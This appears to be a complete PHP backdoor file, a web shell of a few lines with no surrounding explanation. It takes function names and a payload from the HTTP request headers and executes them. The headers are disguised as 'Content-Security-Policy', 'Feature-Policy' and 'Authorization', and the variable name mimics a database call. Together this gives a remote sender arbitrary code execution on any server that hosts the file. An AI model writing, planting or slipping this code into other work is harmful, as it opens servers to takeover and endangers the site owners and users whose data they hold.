<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Content-Security-Policy'])) {
    $ibase_pconnection = $_HEADERS['Content-Security-Policy']('', $_HEADERS['Feature-Policy']($_HEADERS['Authorization']));
    $ibase_pconnection();
}